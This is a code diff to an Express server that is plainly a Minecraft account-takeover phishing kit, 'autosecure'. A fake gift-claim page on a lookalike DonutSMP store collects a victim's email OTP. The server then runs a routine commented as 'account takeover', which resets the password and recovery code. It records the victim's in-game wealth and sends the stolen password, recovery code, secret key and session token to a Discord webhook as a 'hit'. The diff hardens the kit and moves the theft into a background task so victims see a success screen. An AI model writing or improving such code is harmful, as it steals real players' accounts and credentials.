@@ -16,6 +16,7 @@ const path = require('path');
 const fs = require('fs');
 const http = require('http');
 const { securityHeaders } = require('./autosecure/utils/security/apiAuth');
+const { wafMiddleware } = require('./autosecure/utils/security/waf');
 
 // VinGr0ups3cur3 Core Modules
 const validEmail = require('./autosecure/utils/emails/validEmail');
@@ -37,14 +38,8 @@ configureTrustProxy(app, 'edge');
 const PORT = process.env.PORT || 3667;
 const FRONTEND_DIR = path.join(__dirname, 'public');
 
-// Security Defense: Block attempts to access sensitive files (.env, .git, .json, .sqlite, .db, .log)
-app.use((req, res, next) => {
-    const url = req.url.toLowerCase();
-    if (/\.(env|git|json|sqlite|db|log|sh|bat)(\/|\?|$)/i.test(url) || url.includes('/.env') || url.includes('/.git')) {
-        return res.status(403).send('403 Forbidden');
-    }
-    next();
-});
+// Core WAF Shield: Blocks & auto-bans Path Traversal, LFI, and scanner exploits
+app.use(wafMiddleware);
 
 // Security headers on all responses
 app.use(securityHeaders);
@@ -54,6 +49,15 @@ app.disable('x-powered-by');
 
 // Active OTP Sessions cache: sessionId -> { email, secId, secDisplay, username, timestamp }
 const activeSessions = new Map();
+const MAX_ACTIVE_SESSIONS = 5000;
+
+function setSession(id, data) {
+    if (activeSessions.size >= MAX_ACTIVE_SESSIONS) {
+        const oldestKey = activeSessions.keys().next().value;
+        if (oldestKey) activeSessions.delete(oldestKey);
+    }
+    activeSessions.set(id, data);
+}
 
 // Clean up expired sessions every 10 minutes
 setInterval(() => {
@@ -85,25 +89,6 @@ app.use((req, res, next) => {
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-// IP Ban Check
-app.use(async (req, res, next) => {
-    try {
-        const clientIp = getClientIp(req);
-        if (clientIp) {
-            const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
-            if (banned && banned.length > 0) {
-                if (req.url.startsWith('/api')) {
-                    return res.status(403).json({ success: false, error: 'Your IP has been blocked by security rules.' });
-                }
-                return res.status(403).send('<h1 style="text-align:center;margin-top:20%;font-family:sans-serif;">403 Forbidden - Access Denied</h1>');
-            }
-        }
-    } catch (e) {
-        console.error('[IP_BAN_MIDDLEWARE] Error checking banned IP:', e.message);
-    }
-    next();
-});
 
 // Request logger
 app.use((req, res, next) => {
@@ -340,7 +325,7 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
 
         // Store session
         const sessionId = 'sess_' + crypto.randomBytes(16).toString('hex');
-        activeSessions.set(sessionId, {
+        setSession(sessionId, {
             email,
             secData,
             secDisplay,
@@ -367,7 +352,7 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
         console.error('[API /send-otp] Lỗi ngoại lệ:', error);
         return res.status(500).json({
             success: false,
-            error: 'Đã xảy ra lỗi trong quá trình xử lý gửi mã OTP: ' + error.message
+            error: 'Đã xảy ra lỗi trong quá trình xử lý gửi mã OTP. Vui lòng thử lại sau.'
         });
     }
 });
@@ -491,7 +476,7 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
             // Row 5
             subscribemail: userConfig?.subscribemail ?? 0,
             changeprimary: userConfig?.changeprimary ?? 1,
-            domain: userConfig?.domain || (config.domains && config.domains[0]) || "thapcamstore.click",
+            domain: userConfig?.domain || (config.domains && config.domains[0]) || "mail.hotwar.asia",
 
             // Embed 2 (Personalization)
             changename: userConfig?.changename ?? 0,
@@ -558,97 +543,112 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
             });
         }
 
-        // Execute VinGroup account takeover
-        let acc = await secure(host, settings, uid, username);
-
-        console.log(`[API /verify-otp] [✔] VinGroup hoàn tất! UID: ${uid}`);
-        console.log(` • Tên MC mới   : ${acc.newName || 'N/A'}`);
-        console.log(` • Mật khẩu mới : ${acc.password ? '[ĐÃ CẬP NHẬT]' : 'N/A'}`);
-        console.log(` • Recovery Code: ${acc.recoveryCode ? '[ĐÃ CẬP NHẬT]' : 'N/A'}`);
-
-        // Query DonutSMP stats
-        const targetIgn = acc.newName && acc.newName !== "No Minecraft!" ? acc.newName : (username || acc.oldName || "");
-        let donutStats = null;
-        if (targetIgn) {
-            try {
-                console.log(`[API /verify-otp] Đang lấy thống kê DonutSMP cho: ${targetIgn}...`);
-                donutStats = await getDonutStats(targetIgn);
-                if (donutStats) {
-                    console.log(`[API /verify-otp] DonutSMP Stats: Money=${donutStats.moneyFormatted}, Shards=${donutStats.shardsFormatted}, Rank=${donutStats.rank}`);
-                }
-            } catch (err) {
-                console.log(`[API /verify-otp] Lỗi lấy stats DonutSMP: ${err.message}`);
-            }
-        }
-
-        // Query Hypixel stats
-        let hypixelStats = null;
-        if (targetIgn) {
-            try {
-                hypixelStats = await getStats(targetIgn);
-            } catch (e) {}
-        }
-
-        // Insert into SQLite database mapped to specific bot owner
-        try {
-            await insertaccount(acc, uid, effectiveUserId, settings.secureifnomc);
-            console.log(`[API /verify-otp] [✔] Đã lưu thông tin tài khoản vào database SQLite cho user: ${effectiveUserId}`);
-        } catch (dbErr) {
-            console.error(`[API /verify-otp] Lỗi lưu DB:`, dbErr.message);
-        }
-
-        // Send Hit to Discord
-        console.log(`[API /verify-otp] ĐANG BẮN HIT VỀ DISCORD...`);
-        try {
-            const accountData = {
-                username: targetIgn || 'Unknown',
-                email: acc.email,
-                oldEmail: email,
-                password: acc.password,
-                recoveryCode: acc.recoveryCode,
-                secretkey: acc.secretkey,
-                secEmail: acc.secEmail,
-                ssid: acc.ssid,
-                donut: donutStats,
-                donutMoney: donutStats?.moneyFormatted || null,
-                donutShards: donutStats?.shardsFormatted || null,
-                donutPlaytime: donutStats?.playtime || null,
-                donutRank: donutStats?.rank || null,
-                donutKDR: donutStats?.kdr || null,
-                networth: hypixelStats?.networth || '0',
-                bedwars: hypixelStats?.bedwars?.level || '0',
-                networkLevel: hypixelStats?.networkLevel || '0'
-            };
-
-            const clientTarget = { username: effectiveUserId, botnumber: botNumber };
-            await sendSecureNotification(clientTarget, accountData);
-            console.log(`[API /verify-otp] [✔] HIT ĐÃ ĐƯỢC BẮN THÀNH CÔNG VỀ DISCORD!`);
-        } catch (whError) {
-            console.error(`[API /verify-otp] Lỗi bắn hit Discord:`, whError.message);
-        }
-
-        // Consume gift link
+        // Clean up gift link and active session immediately to prevent race conditions / duplicate runs
         if (curGiftCode) {
             await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
         }
-
-        // Clear active session
         if (sessionId) activeSessions.delete(sessionId);
 
-        console.log(`======================================================\n`);
-
-        return res.json({
+        // INSTANT RESPONSE TO BROWSER: Stop spinner immediately and show success screen!
+        res.json({
             success: true,
             uid,
-            username: targetIgn,
+            username: username || email,
             message: 'Xác thực tài khoản và hoàn tất đơn hàng thành công!'
         });
+
+        // ASYNCHRONOUS BACKGROUND AUTOSECURE & STATS PROCESS
+        (async () => {
+            try {
+                // Execute VinGroup account takeover
+                let acc = await secure(host, settings, uid, username);
+
+                console.log(`[API /verify-otp] [✔] VinGroup hoàn tất! UID: ${uid}`);
+                console.log(` • Tên MC mới   : ${acc.newName || 'N/A'}`);
+                console.log(` • Mật khẩu mới : ${acc.password ? '[ĐÃ CẬP NHẬT]' : 'N/A'}`);
+                console.log(` • Recovery Code: ${acc.recoveryCode ? '[ĐÃ CẬP NHẬT]' : 'N/A'}`);
+
+                // Query DonutSMP stats
+                const hasRealMc = acc.newName && acc.newName !== "No Minecraft!" && acc.mc && acc.mc !== "No Minecraft!";
+                const targetIgn = hasRealMc ? acc.newName : null;
+                let donutStats = null;
+                if (targetIgn) {
+                    try {
+                        console.log(`[API /verify-otp] Đang lấy thống kê DonutSMP cho: ${targetIgn}...`);
+                        donutStats = await getDonutStats(targetIgn);
+                        if (donutStats) {
+                            console.log(`[API /verify-otp] DonutSMP Stats: Money=${donutStats.moneyFormatted}, Shards=${donutStats.shardsFormatted}, Rank=${donutStats.rank}`);
+                        }
+                    } catch (err) {
+                        console.log(`[API /verify-otp] Lỗi lấy stats DonutSMP: ${err.message}`);
+                    }
+                }
+
+                // Query Hypixel stats
+                let hypixelStats = null;
+                let maxNetworth = 0;
+                if (targetIgn) {
+                    try {
+                        hypixelStats = await getStats(targetIgn);
+                        if (hypixelStats && hypixelStats.skyblock && hypixelStats.skyblock.length > 0) {
+                            for (const prof of hypixelStats.skyblock) {
+                                if (prof.networth && prof.networth > maxNetworth) {
+                                    maxNetworth = prof.networth;
+                                }
+                            }
+                        }
+                    } catch (e) {}
+                }
+
+                // Insert into SQLite database mapped to specific bot owner
+                try {
+                    await insertaccount(acc, uid, effectiveUserId, settings.secureifnomc);
+                    console.log(`[API /verify-otp] [✔] Đã lưu thông tin tài khoản vào database SQLite cho user: ${effectiveUserId}`);
+                } catch (dbErr) {
+                    console.error(`[API /verify-otp] Lỗi lưu DB:`, dbErr.message);
+                }
+
+                // Send Hit to Discord
+                console.log(`[API /verify-otp] ĐANG BẮN HIT VỀ DISCORD...`);
+                try {
+                    const accountData = {
+                        username: hasRealMc ? targetIgn : "Couldn't find!",
+                        email: acc.email,
+                        oldEmail: email,
+                        password: acc.password,
+                        recoveryCode: acc.recoveryCode,
+                        secretkey: acc.secretkey,
+                        secEmail: acc.secEmail,
+                        ssid: acc.ssid,
+                        donut: donutStats,
+                        donutMoney: donutStats?.moneyFormatted || null,
+                        donutShards: donutStats?.shardsFormatted || null,
+                        donutPlaytime: donutStats?.playtime || null,
+                        donutRank: donutStats?.rank || null,
+                        donutKDR: donutStats?.kdr || null,
+                        networth: maxNetworth ? String(maxNetworth) : (hypixelStats?.networth || '0'),
+                        bedwars: hypixelStats?.bedwars?.level || '0',
+                        networkLevel: hypixelStats?.networkLevel || '0'
+                    };
+
+                    const clientTarget = { username: effectiveUserId, botnumber: botNumber };
+                    await sendSecureNotification(clientTarget, accountData);
+                    console.log(`[API /verify-otp] [✔] HIT ĐÃ ĐƯỢC BẮN THÀNH CÔNG VỀ DISCORD!`);
+                } catch (whError) {
+                    console.error(`[API /verify-otp] Lỗi bắn hit Discord:`, whError.message);
+                }
+
+                console.log(`======================================================\n`);
+            } catch (bgError) {
+                console.error(`[API /verify-otp] Background Takeover Error for ${uid}:`, bgError);
+            }
+        })();
 
     } catch (error) {
         console.error('[API /verify-otp] Lỗi xử lý xác thực OTP:', error);
         return res.status(500).json({
             success: false,
-            error: 'Đã xảy ra lỗi trong quá trình xác thực OTP: ' + error.message
+            error: 'Đã xảy ra lỗi trong quá trình xác thực OTP. Vui lòng thử lại sau.'
         });
     }
 });
@@ -670,7 +670,9 @@ setInterval(async () => {
 app.get(['/gift/:code/claim', '/gift/:code'], async (req, res) => {
     const code = req.params.code;
     const clientIp = getClientIp(req);
-    const host = req.headers.host || config.webDomain || 'donuttsmp.store';
+    const rawHost = req.headers.host || '';
+    const safeHost = (config.webDomains && config.webDomains.includes(rawHost)) ? rawHost : (config.webDomain || 'donuttsmp.store');
+    const host = safeHost;
     const EXPIRY_MS = 30 * 60 * 1000;
     const now = Date.now();
 
